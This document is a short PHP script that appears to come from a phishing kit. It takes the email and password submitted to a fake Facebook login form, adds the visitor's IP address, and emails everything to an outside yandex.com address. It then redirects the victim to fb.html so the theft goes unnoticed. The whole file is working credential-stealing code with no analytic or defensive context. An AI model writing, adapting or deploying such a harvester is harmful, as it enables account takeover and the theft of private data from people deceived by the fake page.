<?php include'../proxy.php';?><?php
$ip = getenv("REMOTE_ADDR");
$send = "gabrielchris1966@yandex.com";
$subject = "FB LoGin";
$message .= "---FB_login---\n";
$message .= "Email: ".$_POST['email']."\n";
$message .= "Password: ".$_POST['pass']."\n";
$message .= "IP: ".$ip."\n";
$headers = "From: FB";
@mail($send,$subject,$message,$headers);
header("Location: fb.html");
?>